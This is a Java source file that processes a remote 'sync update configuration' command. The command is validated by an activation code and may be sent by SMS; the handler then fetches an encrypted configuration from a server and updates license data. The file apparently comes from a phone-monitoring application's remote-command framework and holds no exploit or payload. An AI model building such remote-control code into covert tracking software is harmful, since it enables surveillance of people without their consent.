package com.vvt.remotecommandmanager.processor.activationandinstallation;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.response.GetConfigurationResponse;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class SyncUpdateConfigurationProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SyncUpdateConfigurationProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private CountDownLatch waitForResponseLatch;
	private LicenseInfo mLicenseInfo;
	private DataDelivery mDataDelivery;
	private StringBuilder mReplyMessageBuilder;
	private LicenseManager mLicenseManager;
	
	public SyncUpdateConfigurationProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, DataDelivery dataDelivery, LicenseManager licenseManager) {
		super(appContext,eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mDataDelivery = dataDelivery;
		mLicenseManager = licenseManager;
	}
	
	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		
		waitForResponseLatch = new CountDownLatch(1);
		
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		DeliveryRequest request = new DeliveryRequest();
		request.setCallerID(100);
		request.setCommandData(new com.vvt.phoenix.prot.command.GetConfiguration());
		request.setDeliveryListener(mDeliveryListener);
		request.setDeliveryRequestType(DeliveryRequestType.REQUEST_TYPE_NEW);
		request.setRequestPriority(PriorityRequest.PRIORITY_NORMAL);
		request.setDataProviderType(DataProviderType.DATA_PROVIDER_TYPE_NONE);
		request.setMaxRetryCount(1);
		request.setDelayTime(1000);
		request.setIsRequireCompression(true);
		request.setIsRequireEncryption(true);
		 
		mDataDelivery.deliver(request);

		// Block the thread and wait till onSuccess or onError called.
		try {
			waitForResponseLatch.await();
		} catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	DeliveryListener mDeliveryListener = new DeliveryListener() {
		@Override
		public void onFinish(DeliveryResponse paramDeliveryResponse) {
			if(LOGV) FxLog.v(TAG, "onFinish # ENTER...");
			if(LOGV) FxLog.v(TAG, String.format("paramDeliveryResponse : %s, getStatusCode : %s", paramDeliveryResponse,paramDeliveryResponse.getStatusCode()));
			if(paramDeliveryResponse.isSuccess()) {
				
				GetConfigurationResponse sar = (GetConfigurationResponse)paramDeliveryResponse.getCSMresponse();
				
				// Save the MD5 And Config ID
				LicenseInfo license = new LicenseInfo();
				license.setActivationCode(mLicenseInfo.getActivationCode());
				license.setConfigurationId(sar.getConfigId());
				license.setLicenseStatus(mLicenseInfo.getLicenseStatus());
				license.setMd5(sar.getMD5());
				mLicenseManager.updateLicense(license);
				
				mReplyMessageBuilder.append(MessageManager.SYNC_UPDATE_CONFIGGURATION_SUCCESS);
				mReplyMessage.setIsSuccess(true);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			}
			else {
				mReplyMessageBuilder.append(RemoteCommandUtil.getErrorMessage(paramDeliveryResponse));
				mReplyMessage.setIsSuccess(false);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				
			}
			
			if(LOGV) FxLog.v(TAG, "onFinish # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGV) FxLog.v(TAG, "onFinish # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onFinish # EXIT...");
			
			waitForResponseLatch.countDown();
		}

		@Override
		public void onProgress(DeliveryResponse paramDeliveryResponse) { }
	};

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		//Command should only have 1 arguments.
		if(!(commandData.getArguments().size() == 1)) {
			throw new InvalidCommandFormatException();
		}
	
		//if invalid activation code it will throw exception.
		RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		
	}
	
	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}


}
